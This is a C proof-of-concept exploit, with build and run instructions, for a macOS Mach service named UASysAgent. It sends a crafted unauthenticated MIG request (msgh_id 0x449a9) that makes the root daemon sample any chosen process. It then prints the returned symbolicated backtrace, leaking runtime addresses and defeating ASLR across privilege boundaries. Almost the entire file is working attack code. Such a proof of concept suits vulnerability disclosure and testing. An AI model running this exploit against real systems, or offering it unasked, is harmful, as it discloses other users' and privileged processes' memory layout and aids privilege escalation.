// PoC: com.apple.unmountassistant.sysagent (UASysAgent) routine 2 (msgh_id 0x449a9)
// Unauthenticated MIG routine: any local process can ask root UASysAgent to
// symbolicate-sample an ARBITRARY target pid; result (runtime addresses + symbols)
// is async-sent to a caller-supplied reply port. Cross-process / cross-privilege
// runtime-address (ASLR) disclosure if it samples a process we couldn't ourselves.
// Build: clang -o uas_poc uas_poc.c
// Run:   ./uas_poc <target_pid>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <unistd.h>

#define MSGID_REQ 0x449a9   /* routine 2 request */
#define MSGID_REPLY 0x44a0d /* routine 2 async reply */

#pragma pack(4)
typedef struct {
    mach_msg_header_t header;
    NDR_record_t NDR;
    int32_t pid;
} Request;   /* must be exactly 0x24 = 36 bytes */

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    char tail[512];          /* NDR + retcode + trailer slack */
} Reply;
#pragma pack()

int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <pid>\n", argv[0]); return 2; }
    int target = atoi(argv[1]);

    fprintf(stderr, "[*] sizeof(Request)=%zu (need 36)\n", sizeof(Request));

    mach_port_t svc = MACH_PORT_NULL;
    kern_return_t kr = bootstrap_look_up(bootstrap_port,
                          "com.apple.unmountassistant.sysagent", &svc);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] bootstrap_look_up failed: 0x%x (%s)\n", kr,
                bootstrap_strerror(kr));
        return 1;
    }
    fprintf(stderr, "[+] looked up service port = 0x%x (as uid=%d)\n", svc, getuid());

    // reply port (receive right); we hand a MAKE_SEND_ONCE to the daemon
    mach_port_t reply = MACH_PORT_NULL;
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply);
    if (kr) { fprintf(stderr, "[-] port_allocate: 0x%x\n", kr); return 1; }

    Request req; memset(&req, 0, sizeof(req));
    req.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND,
                                          MACH_MSG_TYPE_MAKE_SEND_ONCE);
    req.header.msgh_size = sizeof(Request);          /* 0x24 */
    req.header.msgh_remote_port = svc;               /* destination */
    req.header.msgh_local_port  = reply;             /* reply port */
    req.header.msgh_id = MSGID_REQ;
    req.NDR = NDR_record;
    req.pid = target;

    kr = mach_msg(&req.header, MACH_SEND_MSG, sizeof(Request), 0,
                  MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] send failed: 0x%x\n", kr); return 1;
    }
    fprintf(stderr, "[+] sent routine-2 request for target pid %d, awaiting async reply...\n", target);

    Reply rep; memset(&rep, 0, sizeof(rep));
    kr = mach_msg(&rep.header, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, sizeof(rep),
                  reply, 8000 /*ms*/, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] recv failed/timeout: 0x%x\n", kr); return 1;
    }
    fprintf(stderr, "[+] got reply: id=0x%x bits=0x%x size=%u complex=%d desc_count=%u\n",
            rep.header.msgh_id, rep.header.msgh_bits, rep.header.msgh_size,
            (rep.header.msgh_bits & MACH_MSGH_BITS_COMPLEX) ? 1 : 0,
            (rep.header.msgh_bits & MACH_MSGH_BITS_COMPLEX) ? rep.body.msgh_descriptor_count : 0);

    if (rep.header.msgh_bits & MACH_MSGH_BITS_COMPLEX && rep.body.msgh_descriptor_count >= 1) {
        void *addr = rep.desc.address;
        mach_msg_size_t size = rep.desc.size;
        fprintf(stderr, "[+] OOL backtrace buffer @ %p size=%u\n", addr, size);
        if (addr && size) {
            printf("==== DISCLOSED SYMBOLICATED SAMPLE OF PID %d (from root UASysAgent) ====\n", target);
            fwrite(addr, 1, size, stdout);
            printf("\n==== END (%u bytes) ====\n", size);
        } else {
            printf("[empty] no sample data -> task access likely denied for pid %d\n", target);
        }
        if (addr && size) vm_deallocate(mach_task_self(), (vm_address_t)addr, size);
    } else {
        fprintf(stderr, "[-] non-complex reply (no OOL data); task access likely denied\n");
    }
    return 0;
}
